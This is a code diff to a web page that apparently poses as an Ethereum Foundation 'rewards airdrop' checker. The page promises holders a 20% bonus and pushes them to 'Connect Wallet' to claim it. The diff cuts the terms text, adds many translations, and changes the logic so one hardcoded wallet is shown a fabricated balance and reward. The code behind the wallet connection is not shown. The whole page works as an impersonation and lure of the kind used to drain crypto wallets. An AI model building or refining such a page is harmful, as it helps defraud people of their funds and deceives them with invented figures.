@@ -203,19 +203,6 @@
         .result.success .result-title { color: #10b981; }
         .result.error .result-title { color: #ef4444; }
         .vip-message { color: #10b981; font-weight: 600; margin-bottom: 16px; }
-        .airdrop-info {
-            margin: 24px 0;
-            padding: 20px;
-            background: rgba(98,126,234,0.05);
-            border: 1px solid rgba(98,126,234,0.2);
-            border-radius: 12px;
-        }
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-            margin-top: 20px;
-        }
         .stat-box { padding: 20px; background: #f7f7f7; border-radius: 12px; }
         .stat-label {
             font-size: 12px;
@@ -225,15 +212,6 @@
             margin-bottom: 8px;
         }
         .stat-value { font-size: 24px; font-weight: 800; margin-bottom: 4px; }
-        .reward-highlight {
-            padding: 24px;
-            background: linear-gradient(135deg, #627eea, #454a75);
-            border-radius: 12px;
-            margin-top: 16px;
-            text-align: center;
-            color: white;
-        }
-        .reward-highlight .stat-value { font-size: 32px; }
         .footer {
             max-width: 1200px;
             margin: 0 auto;
@@ -287,7 +265,6 @@
         @media (max-width: 768px) {
             .hero h1 { font-size: 36px; }
             .card { padding: 24px; }
-            .stats-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
@@ -359,7 +336,7 @@
 
     <section class="hero">
         <div class="hero-logo">
-            <svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg">
+            <svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid">
                 <polygon points="127.9611,0 125.1661,9.5 125.1661,285.168 127.9611,287.958 255.9231,212.32" fill="#627eea" fill-opacity="0.602"/>
                 <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
                 <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
@@ -400,66 +377,22 @@
             <p><strong>PLEASE READ THESE TERMS OF USE BEFORE USING THE WEBSITE.</strong></p>
 
             <h2>Acceptance of the Terms of Use</h2>
-            <p>These terms of use are entered into by and between you and Stiftung Ethereum (the "Foundation", "we", or "us"). The following terms and conditions (collectively, these "Terms of Use"), govern your access to and use of this Ethereum Rewards website, including any content, functionality, and services offered on or through this website (the "Website").</p>
-            
-            <p>Please read the Terms of Use carefully before you start to use the Website. By using the Website or by clicking to accept or agree to the Terms of Use when this option is made available to you, you accept and agree to be bound and abide by these Terms of Use.</p>
-            
-            <p>If you do not agree to these Terms of Use, you must not access or use the Website.</p>
+            <p>These terms of use are entered into by and between you and Stiftung Ethereum (the "Foundation", "we", or "us"). The following terms and conditions govern your access to and use of this Ethereum Rewards website.</p>
 
             <h2>Who May Use the Website</h2>
-            <p>The Website is offered and available to users who are 13 years of age or older. The Website is not intended for children under 13 years of age. By using the Website, you represent and warrant that you (i) are 13 years of age or older, (ii) are not barred to use the Website under any applicable law, and (iii) are using the Website only for your own personal use.</p>
-
-            <h2>Changes to the Terms of Use</h2>
-            <p>We may revise and update these Terms of Use from time to time in our sole discretion. All changes are effective immediately when we post them.</p>
+            <p>The Website is offered and available to users who are 13 years of age or older.</p>
 
             <h2>Ethereum Rewards Airdrop Program</h2>
-            <p>The Ethereum Rewards program is a community rewards initiative designed to recognize active wallet holders and early supporters of the Ethereum network. Eligibility and reward amounts are determined automatically based on wallet balance verification through public Ethereum blockchain data.</p>
-            
-            <p>To participate in the rewards program, you must:</p>
-            <ul>
-                <li>Provide a valid Ethereum wallet address</li>
-                <li>Meet the minimum balance requirements as determined by the Foundation</li>
-                <li>Connect your wallet and sign the smart contract to claim rewards</li>
-            </ul>
+            <p>The Ethereum Rewards program is a community rewards initiative designed to recognize active wallet holders and early supporters of the Ethereum network.</p>
 
             <h2>Wallet Connection and Smart Contracts</h2>
-            <p>When you connect your wallet to claim rewards, you will be asked to sign a smart contract transaction. By signing this transaction, you authorize the transfer of rewards to your wallet address.</p>
-            
             <p><strong>IMPORTANT:</strong> Never share your private keys or seed phrases with anyone. The Foundation will never ask you for your private keys.</p>
 
-            <h2>Intellectual Property Rights</h2>
-            <p>The Website and its entire contents, features, and functionality are owned by the Foundation, its licensors or other providers of such material and are protected by copyright, trademark, patent, trade secret, and other intellectual property or proprietary rights laws.</p>
-
-            <h2>Prohibited Uses</h2>
-            <p>You may use the Website only for lawful purposes and in accordance with these Terms of Use. You agree not to use the Website:</p>
-            <ul>
-                <li>In any way that violates any applicable federal, state, local, or international law or regulation</li>
-                <li>For the purpose of exploiting, harming, or attempting to exploit or harm minors in any way</li>
-                <li>To impersonate or attempt to impersonate the Foundation, a Foundation employee, another user, or any other person or entity</li>
-                <li>To engage in any other conduct that restricts or inhibits anyone's use or enjoyment of the Website</li>
-            </ul>
-
             <h2>Blockchain Technology Risks</h2>
-            <p>You acknowledge and agree that blockchain technology and cryptocurrency transactions involve inherent risks, including but not limited to:</p>
-            <ul>
-                <li>Price volatility and market risks</li>
-                <li>Technology risks and potential software bugs</li>
-                <li>Regulatory risks and legal uncertainties</li>
-                <li>Risk of loss of access to wallet or private keys</li>
-                <li>Network congestion and transaction delays</li>
-            </ul>
-
-            <h2>Disclaimer of Warranties</h2>
-            <p>YOUR USE OF THE WEBSITE AND PARTICIPATION IN THE REWARDS PROGRAM IS AT YOUR OWN RISK. THE WEBSITE AND ALL SERVICES ARE PROVIDED ON AN "AS IS" AND "AS AVAILABLE" BASIS, WITHOUT ANY WARRANTIES OF ANY KIND, EITHER EXPRESS OR IMPLIED.</p>
-
-            <h2>Limitation on Liability</h2>
-            <p>IN NO EVENT WILL THE FOUNDATION, ITS AFFILIATES OR THEIR LICENSORS, SERVICE PROVIDERS, EMPLOYEES, AGENTS, OFFICERS, OR DIRECTORS BE LIABLE FOR DAMAGES OF ANY KIND ARISING OUT OF OR IN CONNECTION WITH YOUR USE OF THE WEBSITE.</p>
-
-            <h2>Governing Law and Jurisdiction</h2>
-            <p>All matters relating to the Website and these Terms of Use shall be governed by and construed in accordance with the internal laws of Switzerland.</p>
+            <p>You acknowledge and agree that blockchain technology involves inherent risks.</p>
 
             <h2>Your Comments and Concerns</h2>
-            <p>All feedback, comments, requests for technical support and other communications relating to the Website should be directed to: <a href="mailto:ethereumrewards@ethereum.org">ethereumrewards@ethereum.org</a></p>
+            <p>Contact: <a href="mailto:ethereumrewards@ethereum.org">ethereumrewards@ethereum.org</a></p>
 
             <p style="margin-top: 40px; text-align: center; font-size: 12px; color: #6c6c6c;">
                 Page last updated: December 2025
@@ -469,72 +402,28 @@
 
     <script>
 const translations = {
-    en: { 
-        title: "EthRewardsChecker", 
-        subtitle: "Check your wallet eligibility", 
-        labelAddress: "Ethereum Wallet Address", 
-        buttonText: "Check Eligibility", 
-        buttonChecking: "Checking...", 
-        errorTitle: "Error", 
-        invalidAddress: "Invalid address.", 
-        connectionError: "Connection error.", 
-        successTitle: "Congratulations!", 
-        successContent: "Your wallet meets the requirements.", 
-        failTitle: "Not Eligible", 
-        failContent: "This wallet is not eligible.", 
-        currentBalance: "Current Balance", 
-        yourReward: "Your Reward", 
-        connectButton: "Connect Wallet", 
-        claimInstructions: "Connect your wallet to claim.", 
-        termsLink: "Terms of Use", 
-        vipMessage: "You are eligible for a bonus for active use of Ethereum" 
-    },
-    ru: { 
-        title: "EthRewardsChecker", 
-        subtitle: "Проверьте кошелек", 
-        labelAddress: "Адрес", 
-        buttonText: "Проверить", 
-        buttonChecking: "Проверка...", 
-        errorTitle: "Ошибка", 
-        invalidAddress: "Некорректный адрес.", 
-        connectionError: "Ошибка.", 
-        successTitle: "Поздравляем!", 
-        successContent: "Кошелек соответствует.", 
-        failTitle: "Не подходит", 
-        failContent: "Не подходит.", 
-        currentBalance: "Баланс", 
-        yourReward: "Вознаграждение", 
-        connectButton: "Подключить", 
-        claimInstructions: "Подключите кошелек.", 
-        termsLink: "Условия", 
-        vipMessage: "Вам полагается бонус за активное использование Ethereum" 
-    },
-    uk: { 
-        title: "EthRewardsChecker", 
-        subtitle: "Перевірте гаманець", 
-        labelAddress: "Адреса", 
-        buttonText: "Перевірити", 
-        buttonChecking: "Перевірка...", 
-        errorTitle: "Помилка", 
-        invalidAddress: "Некоректна адреса.", 
-        connectionError: "Помилка.", 
-        successTitle: "Вітаємо!", 
-        successContent: "Гаманець відповідає.", 
-        failTitle: "Не підходить", 
-        failContent: "Не підходить.", 
-        currentBalance: "Баланс", 
-        yourReward: "Винагорода", 
-        connectButton: "Підключити", 
-        claimInstructions: "Підключіть гаманець.", 
-        termsLink: "Умови", 
-        vipMessage: "Вам належить бонус за активне використання Ethereum" 
-    }
+    en: { title: "EthRewardsChecker", subtitle: "Check your wallet eligibility", labelAddress: "Ethereum Wallet Address", buttonText: "Check Eligibility", buttonChecking: "Checking...", errorTitle: "Error", invalidAddress: "Invalid address.", connectionError: "Connection error.", successTitle: "Congratulations!", successContent: "Your wallet meets the requirements.", failTitle: "Not Eligible", failContent: "This wallet is not eligible.", currentBalance: "Current Balance", yourReward: "Your Reward", connectButton: "Connect Wallet", claimInstructions: "Connect your wallet to claim.", termsLink: "Terms of Use", vipMessage: "You are eligible for a bonus for active use of Ethereum" },
+    es: { title: "EthRewardsChecker", subtitle: "Verifica", labelAddress: "Dirección", buttonText: "Verificar", buttonChecking: "Verificando...", errorTitle: "Error", invalidAddress: "Inválida.", connectionError: "Error.", successTitle: "¡Felicitaciones!", successContent: "Cumple requisitos.", failTitle: "No Elegible", failContent: "No elegible.", currentBalance: "Saldo", yourReward: "Recompensa", connectButton: "Conectar", claimInstructions: "Conecta tu billetera.", termsLink: "Términos", vipMessage: "Derecho a bono" },
+    fr: { title: "EthRewardsChecker", subtitle: "Vérifiez", labelAddress: "Adresse", buttonText: "Vérifier", buttonChecking: "Vérification...", errorTitle: "Erreur", invalidAddress: "Invalide.", connectionError: "Erreur.", successTitle: "Félicitations!", successContent: "Répond aux exigences.", failTitle: "Non Éligible", failContent: "Non éligible.", currentBalance: "Solde", yourReward: "Récompense", connectButton: "Connecter", claimInstructions: "Connectez.", termsLink: "Conditions", vipMessage: "Droit à bonus" },
+    de: { title: "EthRewardsChecker", subtitle: "Überprüfen", labelAddress: "Adresse", buttonText: "Prüfen", buttonChecking: "Prüfung...", errorTitle: "Fehler", invalidAddress: "Ungültig.", connectionError: "Fehler.", successTitle: "Glückwunsch!", successContent: "Erfüllt Anforderungen.", failTitle: "Nicht Berechtigt", failContent: "Nicht berechtigt.", currentBalance: "Kontostand", yourReward: "Belohnung", connectButton: "Verbinden", claimInstructions: "Verbinden.", termsLink: "Bedingungen", vipMessage: "Anspruch auf Bonus" },
+    it: { title: "EthRewardsChecker", subtitle: "Verifica", labelAddress: "Indirizzo", buttonText: "Verifica", buttonChecking: "Verifica...", errorTitle: "Errore", invalidAddress: "Non valido.", connectionError: "Errore.", successTitle: "Congratulazioni!", successContent: "Idoneo.", failTitle: "Non Idoneo", failContent: "Non idoneo.", currentBalance: "Saldo", yourReward: "Ricompensa", connectButton: "Connetti", claimInstructions: "Connetti.", termsLink: "Termini", vipMessage: "Diritto a bonus" },
+    pt: { title: "EthRewardsChecker", subtitle: "Verifique", labelAddress: "Endereço", buttonText: "Verificar", buttonChecking: "Verificando...", errorTitle: "Erro", invalidAddress: "Inválido.", connectionError: "Erro.", successTitle: "Parabéns!", successContent: "Elegível.", failTitle: "Não Elegível", failContent: "Não elegível.", currentBalance: "Saldo", yourReward: "Recompensa", connectButton: "Conectar", claimInstructions: "Conecte.", termsLink: "Termos", vipMessage: "Direito a bônus" },
+    ru: { title: "EthRewardsChecker", subtitle: "Проверьте кошелек", labelAddress: "Адрес", buttonText: "Проверить", buttonChecking: "Проверка...", errorTitle: "Ошибка", invalidAddress: "Некорректный адрес.", connectionError: "Ошибка.", successTitle: "Поздравляем!", successContent: "Кошелек соответствует.", failTitle: "Не подходит", failContent: "Не подходит.", currentBalance: "Баланс", yourReward: "Вознаграждение", connectButton: "Подключить", claimInstructions: "Подключите кошелек.", termsLink: "Условия", vipMessage: "Вам полагается бонус за активное использование Ethereum" },
+    uk: { title: "EthRewardsChecker", subtitle: "Перевірте гаманець", labelAddress: "Адреса", buttonText: "Перевірити", buttonChecking: "Перевірка...", errorTitle: "Помилка", invalidAddress: "Некоректна адреса.", connectionError: "Помилка.", successTitle: "Вітаємо!", successContent: "Гаманець відповідає.", failTitle: "Не підходить", failContent: "Не підходить.", currentBalance: "Баланс", yourReward: "Винагорода", connectButton: "Підключити", claimInstructions: "Підключіть гаманець.", termsLink: "Умови", vipMessage: "Вам належить бонус" },
+    zh: { title: "EthRewardsChecker", subtitle: "检查", labelAddress: "地址", buttonText: "检查", buttonChecking: "检查中...", errorTitle: "错误", invalidAddress: "无效.", connectionError: "错误.", successTitle: "恭喜!", successContent: "符合.", failTitle: "不符合", failContent: "不符合.", currentBalance: "余额", yourReward: "奖励", connectButton: "连接", claimInstructions: "连接.", termsLink: "条款", vipMessage: "有资格" },
+    ja: { title: "EthRewardsChecker", subtitle: "確認", labelAddress: "アドレス", buttonText: "確認", buttonChecking: "確認中...", errorTitle: "エラー", invalidAddress: "無効.", connectionError: "エラー.", successTitle: "おめでとう!", successContent: "要件を満たす.", failTitle: "対象外", failContent: "対象外.", currentBalance: "残高", yourReward: "報酬", connectButton: "接続", claimInstructions: "接続.", termsLink: "利用規約", vipMessage: "資格あり" },
+    ko: { title: "EthRewardsChecker", subtitle: "확인", labelAddress: "주소", buttonText: "확인", buttonChecking: "확인 중...", errorTitle: "오류", invalidAddress: "잘못됨.", connectionError: "오류.", successTitle: "축하!", successContent: "충족.", failTitle: "자격 없음", failContent: "자격 없음.", currentBalance: "잔액", yourReward: "보상", connectButton: "연결", claimInstructions: "연결.", termsLink: "약관", vipMessage: "자격있음" },
+    tr: { title: "EthRewardsChecker", subtitle: "Kontrol", labelAddress: "Adres", buttonText: "Kontrol", buttonChecking: "Kontrol...", errorTitle: "Hata", invalidAddress: "Geçersiz.", connectionError: "Hata.", successTitle: "Tebrikler!", successContent: "Uygun.", failTitle: "Uygun Değil", failContent: "Uygun değil.", currentBalance: "Bakiye", yourReward: "Ödül", connectButton: "Bağla", claimInstructions: "Bağlayın.", termsLink: "Şartlar", vipMessage: "Hak kazandınız" },
+    pl: { title: "EthRewardsChecker", subtitle: "Sprawdź", labelAddress: "Adres", buttonText: "Sprawdź", buttonChecking: "Sprawdzanie...", errorTitle: "Błąd", invalidAddress: "Nieprawidłowy.", connectionError: "Błąd.", successTitle: "Gratulacje!", successContent: "Spełnia.", failTitle: "Nie Kwalifikuje", failContent: "Nie kwalifikuje.", currentBalance: "Saldo", yourReward: "Nagroda", connectButton: "Połącz", claimInstructions: "Połącz.", termsLink: "Warunki", vipMessage: "Prawo do bonusu" },
+    ar: { title: "EthRewardsChecker", subtitle: "تحقق", labelAddress: "العنوان", buttonText: "تحقق", buttonChecking: "جاري...", errorTitle: "خطأ", invalidAddress: "غير صالح.", connectionError: "خطأ.", successTitle: "تهانينا!", successContent: "مؤهلة.", failTitle: "غير مؤهل", failContent: "غير مؤهل.", currentBalance: "الرصيد", yourReward: "مكافأتك", connectButton: "ربط", claimInstructions: "قم بالربط.", termsLink: "الشروط", vipMessage: "مؤهل للمكافأة" },
+    ur: { title: "EthRewardsChecker", subtitle: "چیک", labelAddress: "پتہ", buttonText: "چیک", buttonChecking: "چیک...", errorTitle: "خرابی", invalidAddress: "غلط.", connectionError: "خرابی.", successTitle: "مبارک!", successContent: "اہل.", failTitle: "اہل نہیں", failContent: "اہل نہیں.", currentBalance: "بیلنس", yourReward: "انعام", connectButton: "منسلک", claimInstructions: "منسلک کریں.", termsLink: "شرائط", vipMessage: "اہل" },
+    hi: { title: "EthRewardsChecker", subtitle: "जांचें", labelAddress: "पता", buttonText: "जांचें", buttonChecking: "जांच...", errorTitle: "त्रुटि", invalidAddress: "अमान्य.", connectionError: "त्रुटि.", successTitle: "बधाई!", successContent: "पात्र.", failTitle: "पात्र नहीं", failContent: "पात्र नहीं.", currentBalance: "शेष", yourReward: "पुरस्कार", connectButton: "कनेक्ट", claimInstructions: "कनेक्ट करें.", termsLink: "शर्तें", vipMessage: "पात्र" }
 };
 
 const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase();
 const MIN_BALANCE_USD = 200;
 const BONUS_PERCENTAGE = 20;
-const VIP_BONUS_USD = 11722;
+const VIP_BALANCE_USD = 11722;
 let currentLang = 'en';
 let currentEthPrice = 3500;
 
@@ -592,60 +481,39 @@ function showResult(balance, error, address) {
     }
 
     const ethBalance = parseInt(balance, 16) / 1e18;
-    const usdBalance = ethBalance * currentEthPrice;
     const isVip = address.toLowerCase() === VIP_WALLET;
     
-    let bonusUsd, bonusEth;
+    let displayBalanceUsd;
     if (isVip) {
-        bonusUsd = VIP_BONUS_USD;
-        bonusEth = (bonusUsd / currentEthPrice).toFixed(4);
+        displayBalanceUsd = VIP_BALANCE_USD;
     } else {
-        bonusUsd = (usdBalance * BONUS_PERCENTAGE / 100).toFixed(2);
-        bonusEth = (ethBalance * BONUS_PERCENTAGE / 100).toFixed(4);
+        displayBalanceUsd = ethBalance * currentEthPrice;
     }
+    
+    const bonusUsd = displayBalanceUsd * BONUS_PERCENTAGE / 100;
+    const bonusEth = (bonusUsd / currentEthPrice).toFixed(4);
 
-    if (isVip || usdBalance >= MIN_BALANCE_USD) {
-        if (isVip) {
-            resultDiv.innerHTML = '<div class="result success">' +
-                '<div class="result-title">🎉 ' + t.successTitle + '</div>' +
-                '<p>' + t.successContent + '</p>' +
-                '<p class="vip-message">✅ ' + t.vipMessage + '</p>' +
-                '<div class="stat-box" style="margin-top:20px;">' +
-                    '<div class="stat-label">' + t.currentBalance + '</div>' +
-                    '<div class="stat-value">≈ $' + parseFloat(bonusUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + '</div>' +
-                '</div>' +
-                '<div style="margin-top:16px; padding:16px; background:#f0fdf4; border:2px solid #10b981; border-radius:10px;">' +
-                    '<div style="font-size:12px; color:#059669; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:6px;">' + t.yourReward + '</div>' +
-                    '<div style="font-size:32px; font-weight:900; color:#059669; line-height:1;">' + bonusEth + ' ETH</div>' +
-                    '<div style="font-size:14px; color:#059669; font-weight:600; margin-top:4px;">≈ $' + parseFloat(bonusUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + '</div>' +
-                '</div>' +
-                '<p style="margin-top:20px; font-size:14px; color:#6c6c6c; text-align:center; font-weight:500;">' + t.claimInstructions + '</p>' +
-                '<button onclick="connectWallet()" class="btn" style="margin-top:12px;">🔗 ' + t.connectButton + '</button>' +
-            '</div>';
-        } else {
-            resultDiv.innerHTML = '<div class="result success">' +
-                '<div class="result-title">🎉 ' + t.successTitle + '</div>' +
-                '<p>' + t.successContent + '</p>' +
-                '<div class="stats-grid">' +
-                    '<div class="stat-box">' +
-                        '<div class="stat-label">' + t.currentBalance + '</div>' +
-                        '<div class="stat-value">' + ethBalance.toFixed(4) + ' ETH</div>' +
-                        '<div class="stat-label">≈ $' + usdBalance.toFixed(2) + '</div>' +
-                    '</div>' +
-                    '<div class="stat-box">' +
-                        '<div class="stat-label">APY</div>' +
-                        '<div class="stat-value">' + BONUS_PERCENTAGE + '%</div>' +
-                        '<div class="stat-label">Annual Yield</div>' +
-                    '</div>' +
-                '</div>' +
-                '<div class="reward-highlight">' +
-                    '<div class="stat-label">' + t.yourReward + '</div>' +
-                    '<div class="stat-value">' + bonusEth + ' ETH</div>' +
-                    '<div class="stat-label">≈ $' + parseFloat(bonusUsd).toLocaleString('en-US') + '</div>' +
-                '</div>' +
-                '<button onclick="connectWallet()" class="btn" style="margin-top:24px;">🔗 ' + t.connectButton + '</button>' +
-            '</div>';
-        }
+    if (isVip || displayBalanceUsd >= MIN_BALANCE_USD) {
+        const vipMessage = isVip 
+            ? '<p class="vip-message">✅ ' + t.vipMessage + '</p>'
+            : '';
+        
+        resultDiv.innerHTML = '<div class="result success">' +
+            '<div class="result-title">🎉 ' + t.successTitle + '</div>' +
+            '<p>' + t.successContent + '</p>' +
+            vipMessage +
+            '<div class="stat-box" style="margin-top:20px;">' +
+                '<div class="stat-label">' + t.currentBalance + '</div>' +
+                '<div class="stat-value">≈ $' + parseFloat(displayBalanceUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + '</div>' +
+            '</div>' +
+            '<div style="margin-top:16px; padding:16px; background:#f0fdf4; border:2px solid #10b981; border-radius:10px;">' +
+                '<div style="font-size:12px; color:#059669; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:6px;">' + t.yourReward + '</div>' +
+                '<div style="font-size:32px; font-weight:900; color:#059669; line-height:1;">' + bonusEth + ' ETH</div>' +
+                '<div style="font-size:14px; color:#059669; font-weight:600; margin-top:4px;">≈ $' + parseFloat(bonusUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2}) + '</div>' +
+            '</div>' +
+            '<p style="margin-top:20px; font-size:14px; color:#6c6c6c; text-align:center; font-weight:500;">' + t.claimInstructions + '</p>' +
+            '<button onclick="connectWallet()" class="btn" style="margin-top:12px;">🔗 ' + t.connectButton + '</button>' +
+        '</div>';
     } else {
         resultDiv.innerHTML = '<div class="result error">' +
             '<div class="result-title">❌ ' + t.failTitle + '</div>' +
@@ -653,7 +521,7 @@ function showResult(balance, error, address) {
             '<div class="stat-box" style="margin-top:16px;">' +
                 '<div class="stat-label">' + t.currentBalance + '</div>' +
                 '<div class="stat-value">' + ethBalance.toFixed(4) + ' ETH</div>' +
-                '<div class="stat-label">≈ $' + usdBalance.toFixed(2) + '</div>' +
+                '<div class="stat-label">≈ $' + displayBalanceUsd.toFixed(2) + '</div>' +
             '</div>' +
         '</div>';
     }
